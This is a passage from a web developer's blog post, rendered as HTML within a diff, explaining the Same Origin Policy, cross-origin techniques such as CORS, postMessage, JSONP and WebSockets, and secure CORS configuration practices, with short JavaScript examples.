+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Server running on port 3000"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span></code></pre>
+<h4 id="client-side">Client-side</h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Request with CORS support</span></span>
+<span class="line"><span style="color:#B392F0">fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"https://api.example.com/data"</span><span style="color:#E1E4E8">, {</span></span>
+<span class="line"><span style="color:#E1E4E8">  method: </span><span style="color:#9ECBFF">"POST"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">  headers: {</span></span>
+<span class="line"><span style="color:#9ECBFF">    "Content-Type"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">"application/json"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    Authorization: </span><span style="color:#9ECBFF">"Bearer token123"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">  },</span></span>
+<span class="line"><span style="color:#E1E4E8">  body: </span><span style="color:#79B8FF">JSON</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">stringify</span><span style="color:#E1E4E8">({ query: </span><span style="color:#9ECBFF">"data"</span><span style="color:#E1E4E8"> }),</span></span>
+<span class="line"><span style="color:#E1E4E8">})</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">response</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> response.</span><span style="color:#B392F0">json</span><span style="color:#E1E4E8">())</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">then</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">data</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(data))</span></span>
+<span class="line"><span style="color:#E1E4E8">  .</span><span style="color:#B392F0">catch</span><span style="color:#E1E4E8">((</span><span style="color:#FFAB70">error</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">=></span><span style="color:#E1E4E8"> console.</span><span style="color:#B392F0">error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Error:"</span><span style="color:#E1E4E8">, error));</span></span></code></pre>
+<h3 id="2-postmessage-api">2. postMessage API</h3>
+<p>postMessage API allows for secure communication between windows, iframe frames, or browser tabs, even if they come from different origins.</p>
+<h4 id="sending-messages">Sending messages</h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// In the parent window</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> iframe</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"child-frame"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">iframe.contentWindow.</span><span style="color:#B392F0">postMessage</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#9ECBFF">  "Hello from parent!"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#9ECBFF">  "https://child-site.com"</span></span>
+<span class="line"><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// In the iframe</span></span>
+<span class="line"><span style="color:#E1E4E8">window.</span><span style="color:#B392F0">addEventListener</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"message"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">event</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">  // Checking the sender's origin</span></span>
+<span class="line"><span style="color:#F97583">  if</span><span style="color:#E1E4E8"> (event.origin </span><span style="color:#F97583">!==</span><span style="color:#9ECBFF"> "https://parent-site.com"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Received message:"</span><span style="color:#E1E4E8">, event.data);</span></span>
+<span class="line"><span style="color:#6A737D">  // Response</span></span>
+<span class="line"><span style="color:#E1E4E8">  event.source.</span><span style="color:#B392F0">postMessage</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Hello from child!"</span><span style="color:#E1E4E8">, event.origin);</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span></code></pre>
+<h3 id="3-jsonp-json-with-padding">3. JSONP (JSON with Padding)</h3>
+<p>JSONP is an older technique that allows for cross-origin requests by dynamically adding <code>&#x3C;script></code> tags.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#F97583">function</span><span style="color:#B392F0"> jsonp</span><span style="color:#E1E4E8">(</span><span style="color:#FFAB70">url</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">callback</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> script</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> document.</span><span style="color:#B392F0">createElement</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"script"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">  const</span><span style="color:#79B8FF"> callbackName</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> "jsonp_"</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> Math.</span><span style="color:#B392F0">round</span><span style="color:#E1E4E8">(Math.</span><span style="color:#B392F0">random</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 1000000</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  window[callbackName] </span><span style="color:#F97583">=</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">data</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">    callback</span><span style="color:#E1E4E8">(data);</span></span>
+<span class="line"><span style="color:#E1E4E8">    document.body.</span><span style="color:#B392F0">removeChild</span><span style="color:#E1E4E8">(script);</span></span>
+<span class="line"><span style="color:#F97583">    delete</span><span style="color:#E1E4E8"> window[callbackName];</span></span>
+<span class="line"><span style="color:#E1E4E8">  };</span></span>
+<span class="line"><span style="color:#E1E4E8">  script.src </span><span style="color:#F97583">=</span></span>
+<span class="line"><span style="color:#E1E4E8">    url </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> (url.</span><span style="color:#B392F0">includes</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"?"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">?</span><span style="color:#9ECBFF"> "&#x26;"</span><span style="color:#F97583"> :</span><span style="color:#9ECBFF"> "?"</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> "callback="</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> callbackName;</span></span>
+<span class="line"><span style="color:#E1E4E8">  document.body.</span><span style="color:#B392F0">appendChild</span><span style="color:#E1E4E8">(script);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Usage</span></span>
+<span class="line"><span style="color:#B392F0">jsonp</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"https://api.example.com/data?param=value"</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">data</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Received data:"</span><span style="color:#E1E4E8">, data);</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span></code></pre>
+<h3 id="4-websockets">4. WebSockets</h3>
+<p>WebSockets are not restricted by Same Origin Policy, but the server can implement its own authorization mechanisms.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#F97583">const</span><span style="color:#79B8FF"> socket</span><span style="color:#F97583"> =</span><span style="color:#F97583"> new</span><span style="color:#B392F0"> WebSocket</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"wss://api.example.com/socket"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">socket.</span><span style="color:#B392F0">onopen</span><span style="color:#F97583"> =</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> () {</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Connection established"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">  socket.</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Hello server!"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">socket.</span><span style="color:#B392F0">onmessage</span><span style="color:#F97583"> =</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">event</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Received message:"</span><span style="color:#E1E4E8">, event.data);</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">socket.</span><span style="color:#B392F0">onerror</span><span style="color:#F97583"> =</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> (</span><span style="color:#FFAB70">error</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">error</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"WebSocket error:"</span><span style="color:#E1E4E8">, error);</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">socket.</span><span style="color:#B392F0">onclose</span><span style="color:#F97583"> =</span><span style="color:#F97583"> function</span><span style="color:#E1E4E8"> () {</span></span>
+<span class="line"><span style="color:#E1E4E8">  console.</span><span style="color:#B392F0">log</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Connection closed"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span></code></pre>
+<h2 id="secure-cors-configuration">Secure CORS configuration</h2>
+<p>Proper CORS configuration is crucial for application security. Here are some best practices:</p>
+<h3 id="1-limiting-allowed-origins">1. Limiting allowed origins</h3>
+<p>Always limit <code>Access-Control-Allow-Origin</code> to specific, trusted domains, avoid using <code>*</code>.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Good - specific domain</span></span>
+<span class="line"><span style="color:#E1E4E8">res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Origin"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"https://trusted-site.com"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Bad - all domains</span></span>
+<span class="line"><span style="color:#E1E4E8">res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Origin"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"*"</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<h3 id="2-limiting-allowed-methods">2. Limiting allowed methods</h3>
+<p>Specify only the HTTP methods that are actually needed.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Good - only needed methods</span></span>
+<span class="line"><span style="color:#E1E4E8">res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Methods"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"GET, POST"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Bad - all methods</span></span>
+<span class="line"><span style="color:#E1E4E8">res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Methods"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"*"</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<h3 id="3-limiting-allowed-headers">3. Limiting allowed headers</h3>
+<p>Specify only the headers that are actually used.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Good - only needed headers</span></span>
+<span class="line"><span style="color:#E1E4E8">res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Headers"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Content-Type, Authorization"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Bad - all headers</span></span>
+<span class="line"><span style="color:#E1E4E8">res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Headers"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"*"</span><span style="color:#E1E4E8">);</span></span></code></pre>
+<h3 id="4-handling-credentials">4. Handling credentials</h3>
+<p>If you need to send credentials (cookies, authorization headers), you must explicitly enable them.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Server-side</span></span>
+<span class="line"><span style="color:#E1E4E8">res.</span><span style="color:#B392F0">header</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Access-Control-Allow-Credentials"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"true"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// Client-side</span></span>
+<span class="line"><span style="color:#B392F0">fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"https://api.example.com/data"</span><span style="color:#E1E4E8">, {</span></span>
+<span class="line"><span style="color:#E1E4E8">  credentials: </span><span style="color:#9ECBFF">"include"</span><span style="color:#E1E4E8">, </span><span style="color:#6A737D">// or 'same-origin'</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span></code></pre>
+<h2 id="same-origin-policy-in-modern-web-applications">Same Origin Policy in modern web applications</h2>
+<p>In modern web applications, which often consist of multiple microservices and APIs, Same Origin Policy can pose challenges. Here are some approaches to dealing with these challenges:</p>
+<h3 id="1-api-gateway-architecture">1. API Gateway architecture</h3>
+<p>Instead of allowing direct access to multiple microservices, use an API gateway that will be the single entry point for clients.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Client -> API Gateway -> Microservices</span></span></code></pre>
+<h3 id="2-proxy-servers">2. Proxy servers</h3>
+<p>You can use a proxy server that will forward requests to different origins, hiding origin differences from the client.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Example proxy configuration in Express</span></span>
+<span class="line"><span style="color:#F97583">const</span><span style="color:#E1E4E8"> { </span><span style="color:#79B8FF">createProxyMiddleware</span><span style="color:#E1E4E8"> } </span><span style="color:#F97583">=</span><span style="color:#B392F0"> require</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"http-proxy-middleware"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">app.</span><span style="color:#B392F0">use</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#9ECBFF">  "/api"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#B392F0">  createProxyMiddleware</span><span style="color:#E1E4E8">({</span></span>
+<span class="line"><span style="color:#E1E4E8">    target: </span><span style="color:#9ECBFF">"https://api.example.com"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    changeOrigin: </span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    pathRewrite: {</span></span>
+<span class="line"><span style="color:#9ECBFF">      "^/api"</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">""</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">    },</span></span>
+<span class="line"><span style="color:#E1E4E8">  })</span></span>
+<span class="line"><span style="color:#E1E4E8">);</span></span></code></pre>
+<h3 id="3-jwt-json-web-tokens">3. JWT (JSON Web Tokens)</h3>
+<p>Use JWT for cross-origin request authorization, which eliminates the need to share cookies between domains.</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// Example of using JWT in a request</span></span>
+<span class="line"><span style="color:#B392F0">fetch</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"https://api.example.com/data"</span><span style="color:#E1E4E8">, {</span></span>
+<span class="line"><span style="color:#E1E4E8">  headers: {</span></span>
+<span class="line"><span style="color:#E1E4E8">    Authorization: </span><span style="color:#9ECBFF">"Bearer "</span><span style="color:#F97583"> +</span><span style="color:#E1E4E8"> jwtToken,</span></span>
+<span class="line"><span style="color:#E1E4E8">  },</span></span>
+<span class="line"><span style="color:#E1E4E8">});</span></span></code></pre>
+<h2 id="summary">Summary</h2>
+<p>Same Origin Policy is a fundamental security mechanism in web browsers that prevents unauthorized access to data and resources between different domains. It is a key element in protection against attacks such as XSS and CSRF.</p>
+<p>Although SOP can pose challenges in modern web applications, there are secure mechanisms such as CORS, postMessage API, and proxy servers that allow for cross-origin communication without violating security principles.</p>
+<p>Understanding Same Origin Policy and its implications is essential for every web application developer to create secure and reliable applications.</p>  </div> </article> </main> <footer data-astro-cid-sz7xmlte>
+&copy; 2025 Mikołaj Cięszczyk. Content is licensed under CC BY-SA 4.0.
+<div class="social-links" data-astro-cid-sz7xmlte> <a href="https://m.webtoo.ls/@astro" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Astro on Mastodon</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/mastodon" data-astro-cid-sz7xmlte><path fill="currentColor" d="M11.19 12.195c2.016-.24 3.77-1.475 3.99-2.603.348-1.778.32-4.339.32-4.339 0-3.47-2.286-4.488-2.286-4.488C12.062.238 10.083.017 8.027 0h-.05C5.92.017 3.942.238 2.79.765c0 0-2.285 1.017-2.285 4.488l-.002.662c-.004.64-.007 1.35.011 2.091.083 3.394.626 6.74 3.78 7.57 1.454.383 2.703.463 3.709.408 1.823-.1 2.847-.647 2.847-.647l-.06-1.317s-1.303.41-2.767.36c-1.45-.05-2.98-.156-3.215-1.928a3.614 3.614 0 0 1-.033-.496s1.424.346 3.228.428c1.103.05 2.137-.064 3.188-.189zm1.613-2.47H11.13v-4.08c0-.859-.364-1.295-1.091-1.295-.804 0-1.207.517-1.207 1.541v2.233H7.168V5.89c0-1.024-.403-1.541-1.207-1.541-.727 0-1.091.436-1.091 1.296v4.079H3.197V5.522c0-.859.22-1.541.66-2.046.456-.505 1.052-.764 1.793-.764.856 0 1.504.328 1.933.983L8 4.39l.417-.695c.429-.655 1.077-.983 1.934-.983.74 0 1.336.259 1.791.764.442.505.661 1.187.661 2.046v4.203z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://twitter.com/astrodotbuild" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Follow Astro on Twitter</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/twitter" data-astro-cid-sz7xmlte><path fill="currentColor" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" data-astro-cid-sz7xmlte></path></svg> </a> <a href="https://github.com/withastro/astro" target="_blank" data-astro-cid-sz7xmlte> <span class="sr-only" data-astro-cid-sz7xmlte>Go to Astro's GitHub repo</span> <svg viewBox="0 0 16 16" aria-hidden="true" width="32" height="32" astro-icon="social/github" data-astro-cid-sz7xmlte><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" data-astro-cid-sz7xmlte></path></svg> </a> </div> </footer>  </body></html>
